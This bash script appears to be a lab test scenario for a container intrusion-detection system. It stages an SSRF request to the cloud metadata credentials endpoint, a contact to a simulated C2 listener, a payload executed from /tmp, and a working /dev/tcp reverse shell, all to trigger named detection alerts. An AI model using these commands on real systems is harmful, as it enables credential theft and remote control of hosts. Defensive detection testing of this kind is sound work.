#!/bin/bash
# Scenario 9: SSRF -> Cloud Metadata Theft -> RCE chain
#
# Attack shape:
#   1. Attacker abuses a vulnerable endpoint in ct-webapp-a to reach an
#      otherwise-firewalled internal address — here, the cloud IMDS at
#      169.254.169.254 (AWS/GCP metadata service).
#   2. Leaked credentials are used to pivot: ct-webapp-a reaches out to a
#      command endpoint it has never spoken to before.
#   3. A dropped payload runs (execve from /tmp) and opens a reverse
#      shell — classic post-exploit telegraph.
#
# Detection chain:
#   - Tier 2 novel edge: (ct-webapp-a, 169.254.169.254, 80) not calibrated
#     -> NovelEdgeAlert with CRITICAL-adjacent severity (link-local
#     attacker-controllable destination is a strong signal).
#   - Tier 2 novel edge: (ct-webapp-a, <C2>, *) second never-seen edge in
#     the same window accumulates via `novel_edge_window` (sliding
#     30s buffer) -> compound confirmation.
#   - Tier 1 execve handler: BIT_TMP_EXEC when binary lives under /tmp.
#   - Tier 1 dup2 invariant: reverse shell closes the loop -> Case A.
#
# MITRE ATT&CK:
#   T1190 Exploit Public-Facing Application
#   T1552.005 Cloud Instance Metadata API
#   T1105 Ingress Tool Transfer
#   T1059.004 Command and Scripting Interpreter
set -e
echo "=== SCENARIO 9: SSRF -> Metadata -> RCE ==="
echo ""

HOST_IP=$(docker network inspect ct_prod_net \
    --format '{{range .IPAM.Config}}{{.Gateway}}{{end}}' 2>/dev/null || echo "10.88.0.1")

echo "[Step 1] SSRF: ct-webapp-a reaches for cloud metadata (169.254.169.254:80)"
docker exec ct-webapp-a /bin/sh -c "
    # Short timeout — we don't expect a response; the edge itself is the signal.
    (echo 'GET /latest/meta-data/iam/security-credentials/ HTTP/1.0'; echo '') \
        | timeout 2 nc -w 1 169.254.169.254 80 2>/dev/null || true
" 2>&1 || true
echo "  Tier 2 should emit novel edge (ct-webapp-a -> 169.254.169.254:80)"

sleep 1

# Second novel edge in the same sliding window — attacker uses "stolen"
# creds to reach a never-seen C2 endpoint. Accumulates in novel_edge_window.
C2_PORT=8443
nc -l -p "$C2_PORT" >/dev/null 2>&1 &
C2_PID=$!
sleep 0.5

echo "[Step 2] Pivot: ct-webapp-a -> attacker C2 at ${HOST_IP}:${C2_PORT}"
docker exec ct-webapp-a /bin/sh -c "
    (echo 'auth_exchange' | nc -w 2 ${HOST_IP} ${C2_PORT}) 2>/dev/null || true
" 2>&1 || true

kill "$C2_PID" 2>/dev/null || true
sleep 0.5

echo "[Step 3] Dropped payload in /tmp, executed (BIT_TMP_EXEC trigger)"
docker exec ct-webapp-a /bin/sh -c "
    printf '#!/bin/sh\necho dropped_payload_running\n' > /tmp/.x
    chmod +x /tmp/.x
    /tmp/.x 2>/dev/null || true
    rm -f /tmp/.x
" 2>&1 || true

echo "[Step 4] Reverse shell (dup2 socket->stdio)"
REV_PORT=9999
nc -l -p "$REV_PORT" >/dev/null 2>&1 &
REV_PID=$!
sleep 0.5
docker exec ct-webapp-a /bin/sh -c "
    /bin/sh -c 'exec 5<>/dev/tcp/${HOST_IP}/${REV_PORT}; cat <&5 | /bin/sh 2>&5 >&5' \
        2>/dev/null || true
" 2>&1 || true
kill "$REV_PID" 2>/dev/null || true
echo "  Exit code: $? (137 = SIGKILL)"

echo ""
echo "Detection layers that should fire:"
echo "  Tier 2: 2 novel edges in 30s window (metadata + C2) -> compound confirmation"
echo "  Tier 1: execve from /tmp -> BIT_TMP_EXEC"
echo "  Tier 1: dup2 socket->stdio -> ALERT_FD_REDIRECT + Case A"
echo "  Trust: attacker IP -> TRUST_BURNED"
echo "=== Scenario 9 complete ==="
